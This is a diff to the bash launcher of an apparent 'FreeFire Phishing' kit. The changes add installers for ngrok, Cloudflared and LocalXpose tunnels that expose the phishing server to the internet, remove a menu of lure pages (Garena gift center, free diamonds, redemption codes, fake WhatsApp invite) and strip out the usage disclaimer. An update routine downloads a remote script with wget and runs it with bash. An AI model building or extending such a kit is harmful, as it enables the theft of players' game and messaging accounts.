@@ -9,7 +9,7 @@ check_status() {
 
 
 ## server
-server() {
+server1() {
 clear
 logo1
 echo " "
@@ -98,6 +98,7 @@ fi
 if [[ $portfrd == "2" || $portfrd == "02" || $portfrd == "ngrok" ]]; then
 echo ""
 clear
+install_ngrok
 ngroktoken
 start_ngrok
 clear
@@ -454,6 +455,65 @@ fi
 echo ""
 }
 
+
+## Install ngrok
+install_ngrok() {
+	if [[ -e "ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
+		else
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
+		fi
+	fi
+}
+
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e "cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
+}
+
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e "loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
+
+
 start_cloudflared() { 
 	rm cld.log > /dev/null 2>&1 &
 	{ sleep 1; }
@@ -645,36 +705,6 @@ echo -e "\e[95m
                            echo ""
 }
 
-## LOGO 2
-logo_text() {
-echo -e "\e[1;96m< < < ====================================================== > > >\e[m "
-printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
-echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Game Kharido \e[0m  \e[95m[\e[32mPro\e[95m]\e[0m     \e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;91;107m Free Fire Skin \e[0m  \e[95m[\e[93mNew\e[95m]\e[0m "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
-echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41m Garena Gift Center \e[0m      \e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;34;103m Free Fire Spin \e[0m  \e[95m[\e[93mNew\e[95m]\e[0m "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;91;107m Magic Event Reward \e[0m      \e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;37;41m Free Coin, Diamond \e[0m  \e[95m[\e[93mNew\e[95m]\e[0m "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;34;103m Redemption Code \e[0m         \e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;91;102m Fack WhatsApp Invite \e[0m  "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;48;5;21m Diamond Buy \e[0m   \e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;48;5;200m Choose Gift + Package Gift + Lucky Spin\e[0m  "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
-echo
-printf "\e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;33mExit\e[0m                      \e[1;31m[\e[0m\e[1;92m50\e[0m\e[1;31m] \e[0m\e[1;33mAbout\e[0m\n"
-echo " "
-echo -e "\e[1;96m< < < ====================================================== > > >\e[m "
-echo ""
-}
 
 
 logo3() {
@@ -994,7 +1024,7 @@ printf "\e[1;92m [ Done ]\e[0m";
 echo "";
 }
 
-check_update () {
+check_update1 () {
 echo ""
 echo -ne "\e[33m Chack Lates Version : " && rm -rf ChackVersion-2.8 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
 echo ""
@@ -1018,38 +1048,9 @@ check_update
 sleep 2
 echo ""
 clear
-echo ""
-	printf "                     \e[91m|===========================|
-	            [¤]   \e[1;33mD I S C L A I M E R${red}   \e[91m[¤]
-	             \e[91m|===========================|\n\n"
-			   echo ""
-printf " \e[91m[!]  \e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of FreeFire Phishing are not responsible for any kind hack and stuff.\n\n• Phishing is illigal if you are using as offensive\n\n• Developers assume NO liability and are NOT responsible for any damage caused by this program\n\n• software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
-echo ""
-echo ""
-printf "\e[31m[\e[32m★\e[31m]\e[93m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
-echo ""
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[96m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
 
-if [[ $option == *'N'* ]]; then
-clear
-exit
-fi
-if [[ $option == *'n'* ]]; then
-clear
-exit
-fi
 
-php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
-ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
-kill -9 $php
-kill -9 $ngrok
-kill -9 $cloudflared
-kill -9 $apache2
-killall -KILL ngrok php cloudflared &>/dev/null
+
 clear
 
 echo -e $'' 
@@ -1058,6 +1059,7 @@ logo1
 logo_text
  server
 			   select_url
+			   
 echo ""
                  
                          done
